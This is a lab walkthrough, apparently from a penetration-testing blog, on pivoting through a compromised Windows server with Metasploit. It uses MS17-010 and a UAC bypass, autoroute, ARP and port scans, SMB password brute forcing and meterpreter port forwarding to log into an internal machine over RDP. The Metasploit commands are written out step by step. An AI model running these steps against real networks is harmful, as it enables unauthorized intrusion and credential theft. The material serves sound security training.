# RDP Pivoting with Metasploit

**Lab Setup requirement:**

**Attacker machine**: Kali Linux

**Pivot Machine \(server\)**: window operating system with **two** network interface

**Target Machine \(client\)**: window 7 \(Allow RDP service\)

![](https://i0.wp.com/4.bp.blogspot.com/-RXRb9RbKbVM/Wc8_x4SWLiI/AAAAAAAARuE/Ip0TWpJAWboG5Sdk18vW0NQwKSZ3l9vVwCLcBGAs/s1600/rdp.png?w=687&ssl=1)

Use exploit MS17-010 or multi handler to hack the pivot machine and bypass its UAC to achieve admin privileges.sessions

| 1 | sessions |
| :--- | :--- |


Hence if you will count then currently attacker has hold 2 sessions, **1st** for meterpreter shell and **2nd** for **bypass UAC** of the server.

![](https://i0.wp.com/3.bp.blogspot.com/-QCeXiZBTToo/WbvgVD4XYjI/AAAAAAAARZE/zpRMmmIjYFokMWibv3n0ypXuTV4YyKRJQCLcBGAs/s1600/1.png?w=687&ssl=1)

Check the network interface through the following command:meterpreter&gt; ifconfig

| 1 | meterpreter&gt; ifconfig |
| :--- | :--- |


From the given image you can observe two networks interface in the victim’s system **1st** for IP **192.168.0.27** through which the attacker is connected and **2nd** for IP **192.168.100.100** through which clients \(targets\) are connected.

![](https://i1.wp.com/4.bp.blogspot.com/-VLxe-RUbEVE/WbvgVAQxO3I/AAAAAAAARZA/ke4JjxQAz2IXf45-jQJy_tgxIVLAR4GBACLcBGAs/s1600/2.png?w=687&ssl=1)

Since the attacker belongs to **192.168.0.1** interface and client belongs to **192.168.100.0** interface, therefore, it is not possible to directly make an attack on client network until unless the attacker acquires the same network connection. In order to achieve 192.168.100.0 network attacker need to run the **post exploitation** “autoroute”.

This module manages session routing via an existing Meterpreter session. It enables other modules to ‘pivot’ through a compromised host when connecting to the named NETWORK and SUBMASK. Autoadd will search a session for valid subnets from the routing table and interface list then add routes to them. The default will add a default route so that all TCP/IP traffic not specified in the MSF routing table will be routed through the session when pivoting.msf &gt; use post/multi/manage/autoroute   
msf post\(autoroute\) &gt; set session 2  
msf post\(autoroute\) &gt; exploit

| 123 | msf &gt; use post/multi/manage/autoroute msf post\(autoroute\) &gt; set session 2msf post\(autoroute\) &gt; exploit |
| :--- | :--- |


**Note:** If you had not to bypass UAC you can use session 1 for post exploit.

![](https://i0.wp.com/4.bp.blogspot.com/-K3JDxJ-vSFY/WbvgVwmvK1I/AAAAAAAARZI/YtAna9EbOjoGbXWODsTU5eYN4Z0BSTolQCLcBGAs/s1600/3.png?w=687&ssl=1)

This Module will perform an ARP scan for a given IP range through a Meterpreter Session.use post/windows/gather/arp\_scanner  
msf post\(arp\_scanner\) &gt; set rhosts 192.168.100.100-110  
msf post\(arp\_scanner\) &gt; set session 2  
msf post\(arp\_scanner\) &gt; set threads 20  
msf post\(arp\_scanner\) &gt; exploit

| 12345 | use post/windows/gather/arp\_scannermsf post\(arp\_scanner\) &gt; set rhosts 192.168.100.100-110msf post\(arp\_scanner\) &gt; set session 2msf post\(arp\_scanner\) &gt; set threads 20msf post\(arp\_scanner\) &gt; exploit |
| :--- | :--- |


 ****Here we found a new IP **192.168.100.103** as shown in the given image. Let’s perform TCP port scan for activated services on this machine.

![](https://i1.wp.com/2.bp.blogspot.com/-V4k4tFjwRdg/WbvgV8_V16I/AAAAAAAARZM/8rnOISQaaSI5Ew4kpwaVyR21K07aYKYBACLcBGAs/s1600/4.png?w=687&ssl=1)

This module Enumerates open TCP services by performing a full TCP connect on each port. This does not need administrative privileges on the source machine, which may be useful if pivoting.use auxiliary/scanner/portscan/tcp  
msf auxiliary\(tcp\) &gt; set ports 445,3389  
msf auxiliary\(tcp\) &gt; set rhosts 192.168.100.103  
msf auxiliary\(tcp\) &gt; set threads 10  
msf auxiliary\(tcp\) &gt;exploit

| 12345 | use auxiliary/scanner/portscan/tcpmsf auxiliary\(tcp\) &gt; set ports 445,3389msf auxiliary\(tcp\) &gt; set rhosts 192.168.100.103msf auxiliary\(tcp\) &gt; set threads 10msf auxiliary\(tcp\) &gt;exploit |
| :--- | :--- |


From given you can observe **port 3389** and **port 445** are **open** and we know that 3389 is used for RDP and 445 is used for SMB.

![](https://i2.wp.com/3.bp.blogspot.com/-zYYn5tiX8J4/WbvgWGIELfI/AAAAAAAARZQ/cVWDArB2DKECRa3CUE0tDjWruxNJomH6wCLcBGAs/s1600/5.png?w=687&ssl=1)

This module will test an SMB login on a range of machines and report successful logins. If you have loaded a database plugin and connected to a database this module will record successful logins and hosts so you can track your access.use auxiliary/scanner/smb/smb\_login  
msf exploit \(smb\_login\)&gt;set rhosts 192.168.100.103  
msf exploit \(smb\_login\)&gt;set user\_file /root/Desktop/user.txt  
msf exploit \(smb\_login\)&gt;set pass\_file /root/Desktop/pass.txt  
msf exploit \(smb\_login\)&gt;set stop\_on\_success true  
msf exploit \(smb\_login\)&gt;exploit

| 123456 | use auxiliary/scanner/smb/smb\_loginmsf exploit \(smb\_login\)&gt;set rhosts 192.168.100.103msf exploit \(smb\_login\)&gt;set user\_file /root/Desktop/user.txtmsf exploit \(smb\_login\)&gt;set pass\_file /root/Desktop/pass.txtmsf exploit \(smb\_login\)&gt;set stop\_on\_success truemsf exploit \(smb\_login\)&gt;exploit |
| :--- | :--- |


 From the given image you can observe the highlights pentest: 123 has success login.

![](https://i1.wp.com/4.bp.blogspot.com/-bc0mJUGMHG4/WbvgWliZr9I/AAAAAAAARZU/Q5_0FCWg_uEcny5rO_avUUqYtBjRP5bxwCLcBGAs/s1600/6.png?w=687&ssl=1)

Now Type the following command for port forwarding on localhost.meterpreter&gt; portfwd add –l 3389 –p 3389 –r 192.168.100.103 

| 1 | meterpreter&gt; portfwd add –l 3389 –p 3389 –r 192.168.100.103  |
| :--- | :--- |


-l: This is a local port to listen on.

-p: The remote port to connect on.

-r:  The remote host address to connect on.

![](https://i1.wp.com/2.bp.blogspot.com/-B-paepTs-zc/WbvgWzkLGNI/AAAAAAAARZY/y5jJX1K5010HpGis32mlua5eDzaegdZWQCLcBGAs/s1600/7.png?w=687&ssl=1)

Now type the following command to connect RDP client on localhost through port 3389rdesktop 127.0.0.1:3389

| 1 | rdesktop 127.0.0.1:3389 |
| :--- | :--- |


![](https://i2.wp.com/2.bp.blogspot.com/-mGrW6Oj2-lQ/WbvgW7OuCiI/AAAAAAAARZc/AJmHMNK0w6szWXZV_M68zJXpQzphCBM5ACLcBGAs/s1600/8.png?w=687&ssl=1)

Now it will ask to enter the credential for connecting with RDP client; Enter the combination of username and password you have retrieved from SMB login Exploit.

If you remembered we have retrieved **pentest: 123** through smb login exploit which we are using for login.

![](https://i2.wp.com/1.bp.blogspot.com/-DEKv_HYkwe0/WbvgXcA1lxI/AAAAAAAARZg/Xpt2OpIa9TM4rGv1yykCNxVbSlD9IPbVwCLcBGAs/s1600/9.1.png?w=687&ssl=1)

**Wonderful!!** We had successfully exploited the RDP client.

![](https://i2.wp.com/3.bp.blogspot.com/-dDVDd4y8S7Q/WbvgXofWsCI/AAAAAAAARZk/-gkK1moKlFwKzFmlCZbSBErAF1BOc7g5ACLcBGAs/s1600/9.png?w=687&ssl=1)

**Author**: Aarti Singh is a Researcher and Technical

